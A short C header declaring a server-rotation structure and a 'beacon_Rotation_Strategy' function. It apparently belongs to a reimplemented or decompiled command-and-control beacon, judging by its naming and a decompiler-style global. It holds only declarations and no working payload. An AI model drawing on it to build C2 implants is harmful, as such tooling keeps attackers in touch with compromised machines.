#pragma once
#include "Veil/Veil.h"

extern int dword_10037E80;
extern char* g_ServerIP_Buff;
typedef struct
{
	DWORD strategyID;
	DWORD rotate_Strategy_time;
	DWORD failover_Strategy_time;
	DWORD failover_Strategy_number;
}rotationstruc;

void init_rotation(rotationstruc* rotation_opt, int strategyID, int rotate_Strategy_time, int failover_Strategy_time, int failover_Strategy_id);

char* beacon_Rotation_Strategy(rotationstruc* rotation_opt, char* ServerIP, int number);